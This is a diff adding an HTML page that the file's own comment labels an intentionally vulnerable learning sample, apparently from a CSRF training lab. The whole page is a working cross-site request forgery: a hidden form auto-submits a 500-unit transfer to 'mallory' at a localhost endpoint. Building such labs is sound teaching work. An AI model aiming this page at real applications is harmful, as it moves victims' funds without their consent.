@@ -1,0 +1,22 @@
+<!-- INTENTIONALLY VULNERABLE. For learning only. Never use in a real app. -->
+<!--
+  BASIC CSRF: UNAUTHORIZED FUNDS TRANSFER
+  Forces victim's browser to send 500 currency units to user 'mallory'.
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Executing CSRF Attack: Transfer Funds</title>
+  </head>
+  <body>
+    <h2>Submitting transfer request to victim application...</h2>
+    <form id="csrf-form" action="http://localhost:5001/api/transfer" method="POST">
+      <input type="hidden" name="to" value="mallory">
+      <input type="hidden" name="amount" value="500">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
